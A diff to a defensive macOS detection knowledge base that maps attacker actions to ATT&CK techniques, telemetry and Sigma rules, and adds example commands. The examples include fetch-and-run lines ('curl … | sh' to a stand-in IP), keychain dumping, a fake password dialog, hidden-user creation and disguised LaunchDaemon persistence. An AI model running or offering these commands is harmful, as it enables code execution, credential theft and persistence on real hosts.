@@ -1,6 +1,6 @@
 {
   "platform": "macos-es",
-  "note": "Seed knowledge base. Detection references are representative of publicly available Sigma logic (SigmaHQ, product: macos) and should be validated against your deployed ruleset. Telemetry assumes a macOS host with an Endpoint Security (ESF) client and/or the unified log emitting process, file, and network events.",
+  "note": "Seed knowledge base. Detection references are representative of publicly available Sigma logic (SigmaHQ, product: macos) and should be validated against your deployed ruleset. Telemetry assumes a macOS host with an Endpoint Security (ESF) client and/or the unified log emitting process, file, and network events. An entry with no `detections` is deliberate: no published rule covers the action, and claiming one would be worse than claiming none. Find these with --coverage-gaps and generate a starter rule with --scaffold.",
   "entries": [
     {
       "id": "whoami",
@@ -23,19 +23,21 @@
     {
       "id": "sw-vers",
       "match": { "program": "sw_vers" },
+      "example": "sw_vers -productVersion",
       "description": "macOS version fingerprinting",
       "techniques": [{ "id": "T1082", "name": "System Information Discovery" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/sw_vers"],
-      "detections": [{ "source": "Sigma", "rule": "System information discovery (proc_creation_macos)", "confidence": "low" }],
+      "detections": [{ "source": "Sigma", "rule": "System Information Discovery Using sw_vers (proc_creation_macos)", "confidence": "low" }],
       "noise": 30
     },
     {
       "id": "system-profiler",
       "match": { "program": "system_profiler" },
+      "example": "system_profiler SPHardwareDataType",
       "description": "Detailed system/hardware inventory",
       "techniques": [{ "id": "T1082", "name": "System Information Discovery" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of system_profiler"],
-      "detections": [{ "source": "Sigma", "rule": "system_profiler execution (proc_creation_macos)", "confidence": "low" }],
+      "detections": [{ "source": "Sigma", "rule": "System Information Discovery Using System_Profiler (proc_creation_macos)", "confidence": "low" }],
       "noise": 35
     },
     {
@@ -53,7 +55,6 @@
       "description": "Spotlight-backed file search — file and directory discovery",
       "techniques": [{ "id": "T1083", "name": "File and Directory Discovery" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of mdfind"],
-      "detections": [{ "source": "Sigma", "rule": "Spotlight file discovery (proc_creation_macos)", "confidence": "low" }],
       "noise": 32
     },
     {
@@ -86,19 +87,21 @@
     {
       "id": "launch-agent-persist",
       "match": { "line": { "contains": "launchagents" }, "event": { "class": "file", "all": [{ "field": "TargetFilename", "contains": "/LaunchAgents/" }, { "field": "TargetFilename", "suffix": ".plist" }] } },
+      "example": "PlistBuddy -c \"Add :RunAtLoad bool true\" /Users/op/Library/LaunchAgents/com.apple.updater.plist",
       "description": "Writing a LaunchAgent plist — user logon persistence",
       "techniques": [{ "id": "T1543.001", "name": "Create or Modify System Process: Launch Agent" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_CREATE of ~/Library/LaunchAgents/*.plist"],
-      "detections": [{ "source": "Sigma", "rule": "LaunchAgent persistence (file_event_macos)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Potential Persistence Via PlistBuddy (proc_creation_macos)", "confidence": "high" }],
       "noise": 66
     },
     {
       "id": "launch-daemon-persist",
       "match": { "line": { "contains": "launchdaemons" }, "event": { "class": "file", "all": [{ "field": "TargetFilename", "contains": "/LaunchDaemons/" }, { "field": "TargetFilename", "suffix": ".plist" }] } },
+      "example": "PlistBuddy -c \"Add :RunAtLoad bool true\" /Library/LaunchDaemons/com.apple.softwareupdated.plist",
       "description": "Writing a LaunchDaemon plist — system-wide persistence",
       "techniques": [{ "id": "T1543.004", "name": "Create or Modify System Process: Launch Daemon" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_CREATE of /Library/LaunchDaemons/*.plist"],
-      "detections": [{ "source": "Sigma", "rule": "LaunchDaemon persistence (file_event_macos)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Potential Persistence Via PlistBuddy (proc_creation_macos)", "confidence": "high" }],
       "noise": 70
     },
     {
@@ -125,10 +128,11 @@
     {
       "id": "keychain-dump",
       "match": { "program": "security", "args": { "contains": "dump-keychain" } },
+      "example": "security dump-keychain -d login.keychain-db",
       "description": "Dumping the login keychain — credential access",
       "techniques": [{ "id": "T1555.001", "name": "Credentials from Password Stores: Keychain" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/security dump-keychain", "ESF open of ~/Library/Keychains/login.keychain-db"],
-      "detections": [{ "source": "Sigma", "rule": "Keychain dump via security (proc_creation_macos)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Credentials from Password Stores - Keychain (proc_creation_macos)", "confidence": "high" }],
       "noise": 78
     },
     {
@@ -137,7 +141,6 @@
       "description": "Extracting a stored secret via security find-*-password",
       "techniques": [{ "id": "T1555.001", "name": "Credentials from Password Stores: Keychain" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of security find-generic-password -w"],
-      "detections": [{ "source": "Sigma", "rule": "Keychain secret extraction (proc_creation_macos)", "confidence": "high" }],
       "noise": 72
     },
     {
@@ -152,10 +155,11 @@
     {
       "id": "osascript-shell",
       "match": { "line": { "contains": "do shell script" } },
+      "example": "osascript -e 'do shell script \"curl -s http://198.51.100.20/a | sh\"'",
       "description": "AppleScript spawning a shell (do shell script) — often privilege prompt abuse",
       "techniques": [{ "id": "T1059.002", "name": "Command and Scripting Interpreter: AppleScript" }],
       "telemetry": ["osascript spawning /bin/sh as a child process (ESF EXEC chain)"],
-      "detections": [{ "source": "Sigma", "rule": "AppleScript do shell script (proc_creation_macos)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "MacOS Scripting Interpreter AppleScript (proc_creation_macos)", "confidence": "high" }],
       "noise": 66
     },
     {
@@ -164,16 +168,16 @@
       "description": "Disabling Gatekeeper via spctl --master-disable — defense evasion",
       "techniques": [{ "id": "T1553.001", "name": "Subvert Trust Controls: Gatekeeper Bypass" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of spctl --master-disable"],
-      "detections": [{ "source": "Sigma", "rule": "Gatekeeper disabled via spctl (proc_creation_macos)", "confidence": "high" }],
       "noise": 74
     },
     {
       "id": "quarantine-removal",
       "match": { "line": { "contains": "com.apple.quarantine" } },
+      "example": "xattr -d com.apple.quarantine /Applications/Updater.app",
       "description": "Removing the quarantine attribute — Gatekeeper bypass",
       "techniques": [{ "id": "T1553.001", "name": "Subvert Trust Controls: Gatekeeper Bypass" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_SETEXTATTR / xattr -d com.apple.quarantine"],
-      "detections": [{ "source": "Sigma", "rule": "Quarantine attribute removal (proc_creation_macos)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "Gatekeeper Bypass via Xattr (proc_creation_macos)", "confidence": "medium" }],
       "noise": 60
     },
     {
@@ -209,7 +213,6 @@
       "description": "Screen capture — collection",
       "techniques": [{ "id": "T1113", "name": "Screen Capture" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of screencapture"],
-      "detections": [{ "source": "Sigma", "rule": "Screen capture via screencapture (proc_creation_macos)", "confidence": "medium" }],
       "noise": 52
     },
     {
@@ -218,16 +221,16 @@
       "description": "Reading the clipboard — collection",
       "techniques": [{ "id": "T1115", "name": "Clipboard Data" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of pbpaste"],
-      "detections": [{ "source": "Sigma", "rule": "Clipboard read via pbpaste (proc_creation_macos)", "confidence": "low" }],
       "noise": 45
     },
     {
       "id": "curl",
       "match": { "program": "curl" },
+      "example": "curl -s http://198.51.100.20/a.applescript | osacompile -o /tmp/a.app -",
       "description": "Remote file transfer / HTTP client — tool ingress or exfil",
       "techniques": [{ "id": "T1105", "name": "Ingress Tool Transfer" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of curl", "outbound network connection"],
-      "detections": [{ "source": "Sigma", "rule": "File transfer via curl (proc_creation_macos)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "Potential In-Memory Download And Compile Of Payloads (proc_creation_macos); plain curl invocations are uncovered", "confidence": "medium" }],
       "noise": 55
     },
     {
@@ -239,7 +242,6 @@
         { "id": "T1071", "name": "Application Layer Protocol" }
       ],
       "telemetry": ["ESF EXEC of bash followed by an outbound connection to the attacker"],
-      "detections": [{ "source": "Sigma", "rule": "Reverse shell via /dev/tcp (proc_creation_macos)", "confidence": "high" }],
       "noise": 80
     },
     {
@@ -290,19 +292,21 @@
     {
       "id": "arp",
       "match": { "program": "arp" },
+      "example": "arp -a",
       "description": "ARP cache enumeration — adjacent host discovery",
       "techniques": [{ "id": "T1018", "name": "Remote System Discovery" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/sbin/arp"],
-      "detections": [{ "source": "Sigma", "rule": "Remote system discovery via arp (proc_creation_macos)", "confidence": "low" }],
+      "detections": [{ "source": "Sigma", "rule": "Macos Remote System Discovery (proc_creation_macos)", "confidence": "low" }],
       "noise": 40
     },
     {
       "id": "dscl-groups",
       "match": { "program": "dscl", "args": { "joined": { "contains": "list /groups" } } },
+      "example": "dscl . -list /Groups",
       "description": "Local group enumeration via dscl",
       "techniques": [{ "id": "T1069.001", "name": "Permission Groups Discovery: Local Groups" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/dscl reading the local group node"],
-      "detections": [{ "source": "Sigma", "rule": "Local group discovery via dscl (proc_creation_macos)", "confidence": "low" }],
+      "detections": [{ "source": "Sigma", "rule": "Local Groups Discovery - MacOs (proc_creation_macos)", "confidence": "low" }],
       "noise": 35
     },
     {
@@ -329,7 +333,6 @@
       "description": "Querying Gatekeeper assessment status — security-software discovery",
       "techniques": [{ "id": "T1518.001", "name": "Software Discovery: Security Software Discovery" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/sbin/spctl with --status"],
-      "detections": [{ "source": "Sigma", "rule": "Gatekeeper status query (proc_creation_macos)", "confidence": "low" }],
       "noise": 35
     },
     {
@@ -389,10 +392,11 @@
     {
       "id": "osascript-phish",
       "match": { "line": { "contains": "with hidden answer" } },
+      "example": "osascript -e 'display dialog \"Software Update requires your password\" default answer \"\" with hidden answer'",
       "description": "AppleScript password prompt (display dialog … with hidden answer) — GUI credential phishing",
       "techniques": [{ "id": "T1056.002", "name": "Input Capture: GUI Input Capture" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/osascript rendering a credential dialog"],
-      "detections": [{ "source": "Sigma", "rule": "osascript credential prompt (proc_creation_macos)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "GUI Input Capture - macOS (proc_creation_macos)", "confidence": "medium" }],
       "noise": 55
     },
     {
@@ -410,7 +414,6 @@
       "description": "Raw TCP/UDP connection via nc — potential C2 or exfil channel",
       "techniques": [{ "id": "T1095", "name": "Non-Application Layer Protocol" }, { "id": "T1071", "name": "Application Layer Protocol" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/nc", "outbound socket observed via a NetworkExtension flow / pf log"],
-      "detections": [{ "source": "Sigma", "rule": "Netcat execution (proc_creation_macos)", "confidence": "medium" }],
       "noise": 70
     },
     {
@@ -419,25 +422,25 @@
       "description": "Ad-hoc HTTP server — data staging / exfiltration channel",
       "techniques": [{ "id": "T1105", "name": "Ingress Tool Transfer" }, { "id": "T1567", "name": "Exfiltration Over Web Service" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of python3 with http.server", "process binding a listening TCP socket"],
-      "detections": [{ "source": "Sigma", "rule": "Ad-hoc Python HTTP server (proc_creation_macos)", "confidence": "medium" }],
       "noise": 55
     },
     {
       "id": "crontab-persist",
       "match": { "program": "crontab" },
+      "example": "crontab /tmp/.cache.cron",
       "description": "Cron job listing or installation — scheduled-task persistence",
       "techniques": [{ "id": "T1053.003", "name": "Scheduled Task/Job: Cron" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/crontab", "ES_EVENT_TYPE_NOTIFY_WRITE of /usr/lib/cron/tabs/<user>"],
-      "detections": [{ "source": "Sigma", "rule": "Cron persistence via crontab (proc_creation_macos)", "confidence": "medium" }],
+      "detections": [{ "source": "Sigma", "rule": "Scheduled Cron Task/Job - MacOs (proc_creation_macos)", "confidence": "medium" }],
       "noise": 45
     },
     {
       "id": "emond-persist",
-      "match": { "line": { "contains": "emond" }, "event": { "class": "file", "any": [{ "field": "TargetFilename", "path_under": "/etc/emond.d" }, { "field": "TargetFilename", "path_under": "/private/var/db/emondClients" }] } },
+      "match": { "line": { "contains": "emond" }, "event": { "class": "file", "any": [{ "field": "TargetFilename", "path_under": "/private/var/db/emondClients" }, { "field": "TargetFilename", "path_under": "/etc/emond.d" }] } },
       "description": "Writing an emond rule — event-monitor persistence",
       "techniques": [{ "id": "T1546.014", "name": "Event Triggered Execution: Emond" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_WRITE under /etc/emond.d/ or /private/var/db/emondClients"],
-      "detections": [{ "source": "Sigma", "rule": "Emond rule persistence (file_event_macos)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "MacOS Emond Launch Daemon (file_event_macos)", "confidence": "high" }],
       "noise": 60
     },
     {
@@ -446,7 +449,6 @@
       "description": "Dropping a periodic script — scheduled-task persistence",
       "techniques": [{ "id": "T1053.003", "name": "Scheduled Task/Job: Cron" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_WRITE under /etc/periodic/{daily,weekly,monthly}"],
-      "detections": [{ "source": "Sigma", "rule": "Periodic script persistence (file_event_macos)", "confidence": "medium" }],
       "noise": 55
     },
     {
@@ -479,10 +481,11 @@
     {
       "id": "hidden-user",
       "match": { "line": { "contains": "ishidden" } },
+      "example": "dscl . -create /Users/svc IsHidden 1",
       "description": "Creating an account with IsHidden — hidden local user for persistence",
       "techniques": [{ "id": "T1564.002", "name": "Hide Artifacts: Hidden Users" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/dscl setting IsHidden on a user record"],
-      "detections": [{ "source": "Sigma", "rule": "Hidden user creation via dscl (proc_creation_macos)", "confidence": "high" }],
+      "detections": [{ "source": "Sigma", "rule": "Hidden User Creation (proc_creation_macos)", "confidence": "high" }],
       "noise": 55
     },
     {
@@ -545,7 +548,6 @@
       "description": "Base64 decoding — deobfuscation of payloads",
       "techniques": [{ "id": "T1140", "name": "Deobfuscate/Decode Files or Information" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/base64 in decode mode"],
-      "detections": [{ "source": "Sigma", "rule": "Base64 decode (proc_creation_macos)", "confidence": "low" }],
       "noise": 45
     },
     {
@@ -554,7 +556,6 @@
       "description": "Archiving data — collection prior to exfiltration",
       "techniques": [{ "id": "T1560.001", "name": "Archive Collected Data: Archive via Utility" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/tar"],
-      "detections": [{ "source": "Sigma", "rule": "Data archived via tar (proc_creation_macos)", "confidence": "low" }],
       "noise": 45
     },
     {
@@ -563,7 +564,6 @@
       "description": "Archiving data via ditto — collection prior to exfiltration",
       "techniques": [{ "id": "T1560.001", "name": "Archive Collected Data: Archive via Utility" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/ditto"],
-      "detections": [{ "source": "Sigma", "rule": "Data archived via ditto (proc_creation_macos)", "confidence": "low" }],
       "noise": 40
     },
     {
@@ -572,7 +572,6 @@
       "description": "File transfer over SSH — ingress or exfiltration",
       "techniques": [{ "id": "T1105", "name": "Ingress Tool Transfer" }, { "id": "T1048", "name": "Exfiltration Over Alternative Protocol" }],
       "telemetry": ["ES_EVENT_TYPE_NOTIFY_EXEC of /usr/bin/scp", "outbound SSH connection to a remote host"],
-      "detections": [{ "source": "Sigma", "rule": "File transfer via scp (proc_creation_macos)", "confidence": "low" }],
       "noise": 45
     },
     {
